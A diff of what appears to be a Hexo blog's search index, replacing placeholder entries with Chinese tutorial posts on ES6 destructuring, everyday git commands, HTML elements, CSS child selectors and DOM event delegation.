+    <url>/2019/09/08/ES6%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</url>
+    <content><![CDATA[<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment" target="_blank" rel="noopener">解构赋值</a>语法是一种 Javascript 表达式。通过解构赋值,可以将属性/值从对象/数组中取出,赋值给其他变量。</p>
+<a id="more"></a>
+<h2 id="简单的结构"><a href="#简单的结构" class="headerlink" title="简单的结构"></a>简单的结构</h2><h3 id="不用解构赋值的方法的代码"><a href="#不用解构赋值的方法的代码" class="headerlink" title="不用解构赋值的方法的代码"></a>不用解构赋值的方法的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> config=&#123;</span><br><span class="line">  method:<span class="string">'m'</span>,</span><br><span class="line">  url:<span class="string">'u'</span>,</span><br><span class="line">  data:<span class="string">'d'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">let</span> method=config.method</span><br><span class="line"> <span class="keyword">let</span> url=config.url</span><br><span class="line"> <span class="keyword">let</span> data=config.data</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">console</span>.log(method,url,data)</span><br></pre></td></tr></table></figure>
+<p>输出的结果是<br><img src="https://s1.ax1x.com/2020/05/08/Yn5Pv4.jpg" alt="Yn5Pv4.jpg"></p>
+<h3 id="使用解构赋值的方法的代码"><a href="#使用解构赋值的方法的代码" class="headerlink" title="使用解构赋值的方法的代码"></a>使用解构赋值的方法的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> config=&#123;</span><br><span class="line">  method:<span class="string">'m'</span>,</span><br><span class="line">  url:<span class="string">'u'</span>,</span><br><span class="line">  data:<span class="string">'d'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  let method=config.method</span></span><br><span class="line"><span class="comment">//  let url=config.url</span></span><br><span class="line"><span class="comment">//  let data=config.data</span></span><br><span class="line">  <span class="keyword">let</span> &#123;method,url,data&#125;=config</span><br><span class="line"> <span class="built_in">console</span>.log(method,url,data)</span><br></pre></td></tr></table></figure>
+<p>输出的结果还是跟前面的一样<br><img src="https://s1.ax1x.com/2020/05/08/Yn5C2F.jpg" alt="Yn5C2F.jpg"><br><strong>稍微注意点就是let method=config.method，前面的method必须要和后面的method一样。如果修改为method1，就不一样，这样就不符合解构赋值的方法，就产生错误</strong><br><img src="https://s1.ax1x.com/2020/05/08/Yn598U.jpg" alt="Yn598U.jpg"></p>
+<h2 id="作为函数实参"><a href="#作为函数实参" class="headerlink" title="作为函数实参"></a>作为函数实参</h2><h3 id="不用解构赋值的方法的代码-1"><a href="#不用解构赋值的方法的代码-1" class="headerlink" title="不用解构赋值的方法的代码"></a>不用解构赋值的方法的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> config=&#123;</span><br><span class="line">  method:<span class="string">'m'</span>,</span><br><span class="line">  url:<span class="string">'u'</span>,</span><br><span class="line">  data:<span class="string">'d'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(x)</span><br><span class="line"> &#125;</span><br><span class="line">fn(&#123;<span class="attr">method</span>:<span class="string">'m'</span>,<span class="attr">url</span>:<span class="string">'u'</span>,<span class="attr">data</span>:<span class="string">'d'</span>&#125;)</span><br></pre></td></tr></table></figure>
+<p>输出结果<br><img src="https://s1.ax1x.com/2020/05/08/Yn4z5V.jpg" alt="Yn4z5V.jpg"></p>
+<h3 id="使用解构赋值的方法的代码-1"><a href="#使用解构赋值的方法的代码-1" class="headerlink" title="使用解构赋值的方法的代码"></a>使用解构赋值的方法的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> config=&#123;</span><br><span class="line">  method:<span class="string">'m'</span>,</span><br><span class="line">  url:<span class="string">'u'</span>,</span><br><span class="line">  data:<span class="string">'d'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  let method=config.method</span></span><br><span class="line"><span class="comment">//  let url=config.url</span></span><br><span class="line"><span class="comment">//  let data=config.data</span></span><br><span class="line">  <span class="keyword">let</span> &#123;method,url,data&#125;=config</span><br><span class="line"><span class="comment">//  console.log(method,url,data)</span></span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(x)</span><br><span class="line"> &#125;</span><br><span class="line">fn(&#123;method,url,data&#125;)</span><br><span class="line"><span class="comment">// fn(&#123;method:'m',url:'u',data:'d'&#125;)</span></span><br></pre></td></tr></table></figure>
+<p>输出结果一样<br><img src="https://s1.ax1x.com/2020/05/08/Yn5FKJ.jpg" alt="Yn5FKJ.jpg"></p>
+<h2 id="对象里面还有对象"><a href="#对象里面还有对象" class="headerlink" title="对象里面还有对象"></a>对象里面还有对象</h2><h3 id="不用解构赋值的方法的代码-2"><a href="#不用解构赋值的方法的代码-2" class="headerlink" title="不用解构赋值的方法的代码"></a>不用解构赋值的方法的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> response=&#123;</span><br><span class="line">  config:&#123;</span><br><span class="line">  method:<span class="string">'m'</span>,</span><br><span class="line">  url:<span class="string">'u'</span>,</span><br><span class="line">  data:<span class="string">'d'</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> config=response.config</span><br><span class="line"><span class="keyword">let</span> method=config.method</span><br><span class="line"><span class="keyword">let</span> url=config.url</span><br><span class="line"><span class="keyword">let</span> data=config.data</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(method,url,data)</span><br></pre></td></tr></table></figure>
+<p>输出的结果<br><img src="https://s1.ax1x.com/2020/05/08/Yn5kr9.jpg" alt="Yn5kr9.jpg"></p>
+<h3 id="使用解构赋值的方法的代码-2"><a href="#使用解构赋值的方法的代码-2" class="headerlink" title="使用解构赋值的方法的代码"></a>使用解构赋值的方法的代码</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> response=&#123;</span><br><span class="line">  config:&#123;</span><br><span class="line">  method:<span class="string">'m'</span>,</span><br><span class="line">  url:<span class="string">'u'</span>,</span><br><span class="line">  data:<span class="string">'d'</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let config=response.config</span></span><br><span class="line"><span class="comment">// let method=config.method</span></span><br><span class="line"><span class="comment">// let url=config.url</span></span><br><span class="line"><span class="comment">// let data=config.data</span></span><br><span class="line"><span class="comment">// let &#123;method,url,data&#125;=config</span></span><br><span class="line"><span class="comment">// let &#123;config&#125;=response</span></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">config</span>:&#123;method,url,data&#125;&#125;=response<span class="comment">//这个是没有声明config</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(method,url,data)<span class="comment">//这里不能输出config，但是可以输出method或url或data</span></span><br></pre></td></tr></table></figure>
+<p>输出的结果一样<br><img src="https://s1.ax1x.com/2020/05/08/Yn5AbR.jpg" alt="Yn5AbR.jpg"><br>需要注意一点，因为这里是没有声明config，所以这里打印config会报错<br><img src="https://s1.ax1x.com/2020/05/08/Yn5VV1.jpg" alt="Yn5VV1.jpg"></p>
+]]></content>
+      <categories>
+        <category>JavaScript</category>
+        <category>ES6</category>
       </categories>
       <tags>
         <tag>JavaScript</tag>
-        <tag>Testing</tag>
+        <tag>ES6</tag>
       </tags>
   </entry>
   <entry>
-    <title>aaaa</title>
-    <url>/2020/02/03/nihao111/</url>
-    <content><![CDATA[<h2 id="diyi"><a href="#diyi" class="headerlink" title="diyi"></a>diyi</h2><ul>
-<li>meiyou </li>
+    <title>修改分支名字</title>
+    <url>/2019/11/15/%E4%BF%AE%E6%94%B9%E5%88%86%E6%94%AF%E5%90%8D%E5%AD%97/</url>
+    <content><![CDATA[<p>我发现我的分支名字错了用下面命令修改分支名字</p>
+<a id="more"></a>
+<ul>
+<li>可以通过下面的命令修改分支    <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git branch -m old_branch new_branch <span class="comment"># Rename branch locally </span></span><br><span class="line">git push origin :old_branch <span class="comment"># Delete the old branch </span></span><br><span class="line">git push --<span class="built_in">set</span>-upstream origin new_branch <span class="comment"># Push the new branch, set local branch to track the new remote</span></span><br></pre></td></tr></table></figure></li>
+<li>注：#号后面的为标注！不需要键入！</li>
+<li>具体见文章——<a href="https://www.cnblogs.com/wangzhichao/p/git.html" target="_blank" rel="noopener">git-更改本地和远程分支的名称</a></li>
 </ul>
 ]]></content>
+      <categories>
+        <category>github</category>
+      </categories>
+      <tags>
+        <tag>github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fetch merge commit</title>
+    <url>/2019/04/20/fetch%20merge%20commit/</url>
+    <content><![CDATA[<h2 id="git-fetch-origin-master"><a href="#git-fetch-origin-master" class="headerlink" title="git fetch origin master"></a>git fetch origin master</h2><p>远程仓库比本地仓库多了一些本地仓库没有的commit，可以使用该命令后与远程仓库在不合并的情况下的获取到远程的commit。</p>
+<a id="more"></a>
+
+<ul>
+<li>运行 git fetch 后，会发生以下活动：</li>
+</ul>
+<ol>
+<li>远程分支上的 commit 会复制到本地仓库</li>
+<li>本地跟踪分支（例如，origin/master）移到指向最新的 commit 需要注意的一点是，本地分支完全不会被改变。<br>你可以将 git fetch 想象成 git pull 它的一半操作，而 git pull 的另一半是合并(git merge)。</li>
+</ol>
+<h2 id="git-merge-origin-master"><a href="#git-merge-origin-master" class="headerlink" title="git merge origin/master"></a>git merge origin/master</h2><p>把远程做的修改更新来本地仓库。</p>
+<h2 id="git-commit-–amend"><a href="#git-commit-–amend" class="headerlink" title="git commit –amend"></a>git commit –amend</h2><p>运行 git commit –amend 来更新最近的 commit，而不是创建新的 commit。</p>
+<h2 id="本地仓库创建分支推送到远程仓库"><a href="#本地仓库创建分支推送到远程仓库" class="headerlink" title="本地仓库创建分支推送到远程仓库"></a>本地仓库创建分支推送到远程仓库</h2><ul>
+<li>命令  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git push --<span class="built_in">set</span>-upstream origin f_sidebar</span><br></pre></td></tr></table></figure>
+这里的f_sidebar就是本地的仓库分支名字，不修改也是就远程仓库分支的名字也叫f_sidebar</li>
+</ul>
+]]></content>
+      <categories>
+        <category>github</category>
+      </categories>
+      <tags>
+        <tag>github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于 HTML 的简单介绍</title>
+    <url>/2018/12/13/%E5%85%B3%E4%BA%8E%20HTML%20%E7%9A%84%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[<h2 id="什么是空标签（查-MDN、博客）"><a href="#什么是空标签（查-MDN、博客）" class="headerlink" title="什么是空标签（查 MDN、博客）"></a>什么是空标签（查 MDN、博客）</h2><ul>
+<li><p>一个空元素（empty element）可能是 HTML，SVG，或者 MathML 里的一个不可能存在子节点（例如内嵌的元素或者元素内的文本）的<a href="https://developer.mozilla.org/en-US/docs/Glossary/element" target="_blank" rel="noopener">element</a>。</p>
+<a id="more"></a>
+</li>
+<li><p>HTML，<a href="https://www.w3.org/TR/SVG2/" target="_blank" rel="noopener">SVG</a> 和 <a href="https://www.w3.org/Math/draft-spec/" target="_blank" rel="noopener">MathML</a> 的规范都详细定义了每个元素能包含的具体内容（define very precisely what each element can contain）。许多组合是没有任何语义含义的，比如一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio" target="_blank" rel="noopener">audio</a> 元素嵌套在一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/hr" target="_blank" rel="noopener">hr</a> 元素里。</p>
+</li>
+<li><p>在 HTML 中，通常在一个空元素上使用一个闭标签是无效的。例如， </p>
+<pre><code class="html"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></code></pre>
+<p>的闭标签是无效的 HTML。<br>在 HTML 中有以下这些<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%A9%BA%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">空元素</a>：</p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/area" target="_blank" rel="noopener">area</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/base" target="_blank" rel="noopener">base</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/br" target="_blank" rel="noopener">br</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/col" target="_blank" rel="noopener">col</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/colgroup" target="_blank" rel="noopener">colgroup</a>——when the <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/colgroup#attr-span" target="_blank" rel="noopener">span</a> is present</p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/command" target="_blank" rel="noopener">command</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/embed" target="_blank" rel="noopener">embed</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/hr" target="_blank" rel="noopener">hr</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img" target="_blank" rel="noopener">img</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" target="_blank" rel="noopener">input</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/keygen" target="_blank" rel="noopener">keygen</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link" target="_blank" rel="noopener">link</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta" target="_blank" rel="noopener">meta</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/param" target="_blank" rel="noopener">param</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/source" target="_blank" rel="noopener">source</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/track" target="_blank" rel="noopener">track</a></p>
+</li>
+<li><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/wbr" target="_blank" rel="noopener">wbr</a></p>
+</li>
+</ul>
+<h2 id="什么是可替换标签（查-MDN、博客）"><a href="#什么是可替换标签（查-MDN、博客）" class="headerlink" title="什么是可替换标签（查 MDN、博客）"></a>什么是可替换标签（查 MDN、博客）</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul>
+<li>CSS 里，<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Replaced_element" target="_blank" rel="noopener">可替换元素（replaced element）</a>的展现不是由CSS来控制的。这些元素是一类 外观渲染独立于CSS的 外部对象。 典型的可替换元素有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/img" target="_blank" rel="noopener">img</a>、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object" target="_blank" rel="noopener">object</a>、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video" target="_blank" rel="noopener">video</a> 和 表单元素，如<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/textarea" target="_blank" rel="noopener">textarea</a>、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" target="_blank" rel="noopener">input</a> 。 某些元素只在一些特殊情况下表现为可替换元素，例如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio" target="_blank" rel="noopener">audio</a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/canvas" target="_blank" rel="noopener">canvas</a> 。   </li>
+<li>通过 CSS content 属性来插入的对象 被称作 <strong>匿名可替换元素</strong>（anonymous replaced elements）。<br>CSS在某些情况下会对可替换元素做特殊处理，比如计算外边距和一些auto值。  </li>
+<li>需要注意的是，一部分（并非全部）可替换元素，本身具有尺寸和基线（baseline），会被像<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/vertical-align" target="_blank" rel="noopener">vertical-align</a>之类的一些 CSS 属性用到。<h2 id="HTML-测验学习："><a href="#HTML-测验学习：" class="headerlink" title="HTML 测验学习："></a>HTML 测验学习：</h2></li>
+</ul>
+<ol>
+<li>HTML 指的是？<br>超文本标记语言（Hyper Text Markup Language）</li>
+<li>Web 标准的制定者是<br>万维网联盟（W3C）</li>
+<li><code>&lt;h1&gt;</code>是最大的标题</li>
+<li><code>&lt;body bgcolor=&quot;yellow&quot;&gt;</code>可以添加背景颜色。<code>&lt;body style=&quot;background-color:yellow;&quot;&gt;</code>也可以</li>
+<li><code>&lt;br&gt;</code>可以插入折行</li>
+<li><code>&lt;b&gt;</code>产生粗体字的 HTML 标签。(Choose the correct HTML element to define important text)<br><code>&lt;strong&gt;</code></li>
+<li><code>&lt;i&gt;</code>产生斜体字的 HTML 标签(Choose the correct HTML element to define emphasized text)<br><code>&lt;em&gt;</code></li>
+<li><code>&lt;a href=&quot;http://www.w3school.com.cn&quot;&gt;W3School&lt;/a&gt;</code>可以产生超链接</li>
+<li><code>&lt;a href=&quot;mailto:xxx@yyy&quot;&gt;</code>制作电子邮件链接</li>
+<li><code>&lt;a href=&quot;url&quot; target=&quot;_blank&quot;&gt;</code>在新窗口打开链接。</li>
+<li><code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;</code>全部都是表格标签。</li>
+<li><code>&lt;td align=&quot;left&quot;&gt;</code>可以使单元格中的内容进行左对齐的正确 HTML 标签。</li>
+<li><code>&lt;ol&gt;</code>产生带有数字列表符号的列表。</li>
+<li><code>&lt;ul&gt;</code>产生带有圆点列表符号的列表。</li>
+<li><code>&lt;input type=&quot;checkbox&quot;&gt;</code>可以产生复选框。</li>
+<li><code>&lt;input type=&quot;text&quot;&gt;</code>可以产生文本框。</li>
+<li><code>&lt;select&gt;</code>可以产生下拉列表(What is the correct HTML for making a drop-down list?)<br><code>&lt;select&gt;</code></li>
+<li><code>&lt;textarea&gt;</code>可以产生文本区（textarea）。</li>
+<li><code>&lt;img src=&quot;image.gif&quot;&gt;</code>可以插入图像。(What is the correct HTML for inserting an image?)<br><code>&lt;img src=&quot;image.gif&quot; alt=&quot;MyImage&quot;&gt;</code></li>
+<li><code>&lt;body background=&quot;background.gif&quot;&gt;</code>可以插入背景图像。(What is the correct HTML for inserting a background image?)<br><code>&lt;body style=&quot;background-image:url(background.gif)&quot;&gt;</code></li>
+<li>Which character is used to indicate an end tag?<br>\</li>
+<li>Inline elements are normally displayed without starting a new line.<br>True</li>
+<li>How can you make a bulleted list?<br><code>&lt;ul&gt;</code></li>
+<li>An <iframe> is used to display a web page within a web page.<br>True</li>
+<li>HTML comments start with <code>&lt;!-- and end with --&gt;</code><br>True</li>
+<li>Block elements are normally displayed without starting a new line.<br>False</li>
+<li>Which HTML element defines the title of a document?<br><code>&lt;title&gt;</code></li>
+<li>Which HTML attribute specifies an alternate text for an image, if the image cannot be displayed?<br>alt</li>
+<li>Which doctype is correct for HTML5?<br><code>&lt;!DOCTYPE html&gt;</code></li>
+<li>Which HTML element is used to specify a footer for a document or section?<br><code>&lt;footer&gt;</code></li>
+<li>In HTML, you can embed SVG elements directly into an HTML page.<br>True</li>
+<li>What is the correct HTML element for playing video files?<br><code>&lt;video&gt;</code></li>
+<li>What is the correct HTML element for playing audio files?<br><code>&lt;audio&gt;</code></li>
+<li>The HTML global attribute, “contenteditable” is used to:<br>Specify whether the content of an element should be editable or not</li>
+<li>In HTML, onblur and onfocus are:<br>Event attributes</li>
+<li>Graphics defined by SVG is in which format?<br>XML</li>
+<li>The HTML <canvas> element is used to:<br>draw graphics</li>
+<li>In HTML, which attribute is used to specify that an input field must be filled out?<br>required</li>
+<li>Which input type defines a slider control?<br>range</li>
+<li>Which HTML element is used to display a scalar measurement within a range?<br><code>&lt;meter&gt;</code></li>
+<li>Which HTML element defines navigation links?<br><code>&lt;nav&gt;</code></li>
+<li>In HTML, what does the <aside> element define?<br>Content aside from the page content</li>
+<li>Which HTML element is used to specify a header for a document or section?<br><code>&lt;header&gt;</code><br>如果想自己测试可以通过下面链接</li>
+</ol>
+<p>W3schools 的 <a href="https://www.w3schools.com/quiztest/quiztest.asp?qtest=HTML" target="_blank" rel="noopener">HTML 测试题（需要FQ）</a><br>如果访问不了这个链接可以尝试访问<a href="https://www.w3school.com.cn/quiz/quiz.asp?quiz=html" target="_blank" rel="noopener">国内的山寨版</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%87%E7%BB%B4%E7%BD%91%E8%81%94%E7%9B%9F" target="_blank" rel="noopener">万维网联盟W3C</a><br><a href="https://zh.wikipedia.org/wiki/MDN_Web_Docs" target="_blank" rel="noopener">MDN 简介</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element" target="_blank" rel="noopener">HTML 元素参考</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/HTML/HTML5/HTML5_element_list" target="_blank" rel="noopener">HTML5 标签列表</a></p>
+]]></content>
+      <categories>
+        <category>HTML</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>修改git hub的仓库名字后怎么push</title>
+    <url>/2019/03/04/hub%E7%9A%84%E4%BB%93%E5%BA%93%E5%90%8D%E5%AD%97%E5%90%8E%E6%80%8E%E4%B9%88push/</url>
+    <content><![CDATA[<p>今天不小心改了git hub上的仓库名字发现了push了半天都报错。  </p>
+<a id="more"></a>
+
+<p>报错部分信息</p>
+<blockquote>
+<p>fatal: Could not read from remote repository.<br>  Please make sure you have the correct access rights<br>  and the repository exists.</p>
+</blockquote>
+<ul>
+<li>accecc rights我肯定是有的。因为修改了repository的名字，肯定是因为这个原因了。<br>解决方案就是通过git bash在本地把远程仓库修改后的地址改一下就好了（因为了仓库名字，仓库地址就会跟着修改）</li>
+</ul>
+<p>修改远程仓库地址</p>
+<p><code>$ git remote -v 显示当前远程仓库地址</code>  </p>
+<p><code>$ git remote set-url origin git@github.con:账户名字/远程残仓库名字.git（这里就是新的远程仓库名的地址）</code><br>第二行命令就是修改远程仓库的地址的意思<br><code>$ git push -u origin master</code></p>
+]]></content>
+      <categories>
+        <category>github</category>
+      </categories>
+      <tags>
+        <tag>github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>子选择器</title>
+    <url>/2020/01/02/%E5%AD%90%E9%80%89%E6%8B%A9%E5%99%A8/</url>
+    <content><![CDATA[<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Child_combinator" target="_blank" rel="noopener">子选择器</a><br>不加&gt;也就是只有空格，此时选择器使用的是子元素或者孙元素，只要下面都可以。</p>
+<a id="more"></a>
+
+<p>如果加了&gt;，此时选择使用的只能是子元素，不可以是用孙元素，只能下一级。</p>
+<p>使用list-style:none；属性</p>
+<p>如果不加&gt;，只使用空格.<br><img src="https://s1.ax1x.com/2020/05/08/YuDtMV.png" alt="YuDtMV.png"><br>如果加了&gt;就不可以。<br><img src="https://s1.ax1x.com/2020/05/08/YuDJx0.png" alt="YuDJx0.png"><br>因为body与nav元素之间还有一个div。</p>
+<p>如果把body和nav之间在加一个div就可以使用了。<br><img src="https://s1.ax1x.com/2020/05/08/YuDG2q.png" alt="YuDG2q.png"></p>
+]]></content>
+      <categories>
+        <category>CSS</category>
+      </categories>
       <tags>
         <tag>CSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>修改已经push了的commit信息</title>
+    <url>/2019/11/02/%E4%BF%AE%E6%94%B9%E5%B7%B2%E7%BB%8Fpush%E4%BA%86%E7%9A%84commit%E4%BF%A1%E6%81%AF/</url>
+    <content><![CDATA[<h2 id="【git】-修改已经push了的commit信息"><a href="#【git】-修改已经push了的commit信息" class="headerlink" title="【git】 修改已经push了的commit信息"></a>【git】 修改已经push了的commit信息</h2><p>由于最后一次我提交的commit信息写错了，所以记录如下修改过程  </p>
+<a id="more"></a>
+<p>如题，本条仅适用于修改已经push过了的最近一次的commit注释信息，确保本地文件的最新的。   </p>
+<p>step1：使用【git commit –amend】命令，会进入到vim编辑器。   </p>
+<p>step2：输入【i】，即进入编辑模式，此时编辑提交信息。  </p>
+<p>step3：编辑好之后，输入【:wq】，即保存和退出。  </p>
+<p>step4：输入【git push -f】强制提交。  </p>
+<p>操作完之后，再看提交记录，即可看到修改的注释信息。 原文来自于<a href="https://blog.csdn.net/qq_33237207/article/details/98621783" target="_blank" rel="noopener">【git】 修改已经push了的commit信息</a>  </p>
+]]></content>
+      <categories>
+        <category>github</category>
+      </categories>
+      <tags>
+        <tag>github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>还原到某个commit的代码</title>
+    <url>/2019/10/23/%E8%BF%98%E5%8E%9F%E5%88%B0%E6%9F%90%E4%B8%AAcommit%E7%9A%84%E4%BB%A3%E7%A0%81/</url>
+    <content><![CDATA[<ul>
+<li>可以用的git 命令  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git reset --hard 后面加commit的代码的ID</span><br><span class="line">//直接还原到某个commit的代码</span><br></pre></td></tr></table></figure>
+<a id="more"></a></li>
+<li>某个commit的代码可以通过下面的命令查看，git reflog对于已经删除也就是reset还原的记录也可以查询到，但是git log不可以查询已经还原的记录。  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure></li>
+<li>找到你需要的记录之后你可以使用git show 后面加commit的代码的ID查看你修改了哪个地方。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>github</category>
+      </categories>
+      <tags>
+        <tag>github</tag>
       </tags>
   </entry>
   <entry>
@@ -329,488 +610,88 @@ JavaScript<figure class="highlight js"><table><tr><td class="code"><pre><span cl
       </tags>
   </entry>
   <entry>
-    <title>aaaa</title>
-    <url>/2020/05/02/nihao/</url>
-    <content><![CDATA[<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><ol>
-<li><p><strong>必考</strong>：事件委托</p>
+    <title>理解DOM事件</title>
+    <url>/2019/06/04/%E7%90%86%E8%A7%A3DOM%E4%BA%8B%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过动效图来分析<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener" target="_blank" rel="noopener">addEventListener</a>在不同情况的捕获和冒泡过程</p>
 <a id="more"></a>
-<ul>
-<li>事件代理（Event Delegation），又称之为<strong>事件委托</strong>。是JavaScript中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把<strong>原本需要绑定在子元素的响应事件（click、keydown……）委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。</strong><br>错误版（但是可能能过）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ul.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.target.tagName.toLowerCase() === <span class="string">'li'</span>)&#123;</span><br><span class="line">        fn() <span class="comment">// 执行某个函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
-bug 在于，如果用户点击的是 li 里面的 span，就没法触发 fn，这显然不对。<br>高级版，用到<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/matches" target="_blank" rel="noopener">Element.matches()</a><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delegate</span>(<span class="params">element, eventType, selector, fn</span>) </span>&#123;<span class="comment">//element是委托的元素，eventType是绑定的事件，selector是事件执行后判断使用的选择器，fn是事件执行后需要执行的函数。</span></span><br><span class="line">    element.addEventListener(eventType, e =&gt; &#123;</span><br><span class="line">      <span class="keyword">let</span> el = e.target</span><br><span class="line">      <span class="keyword">while</span> (!el.matches(selector)) &#123;<span class="comment">//判断执行事件的元素如果是selector选择器就不仅如此这个循环</span></span><br><span class="line">        <span class="keyword">if</span> (element === el) &#123;<span class="comment">//如果不是这个selector那么就进入这个循环，然后判断是不是委托的元素element。如果是这里就把el设置为null，并且中止退出循环，也可以看成到顶的一个元素，也就是委托的元素</span></span><br><span class="line">          el = <span class="literal">null</span></span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        el = el.parentNode<span class="comment">//如果不是委托的element，那么说明还需要在父节点上面继续找，继续循环</span></span><br><span class="line">      &#125;</span><br><span class="line">      el &amp;&amp; fn.call(el, e, el)<span class="comment">//如果el存在，就执行函数fu,并且传入this为el,并传入两个参数e和el。</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> element<span class="comment">//返回这个事件委托的元素，为了让外面知道</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
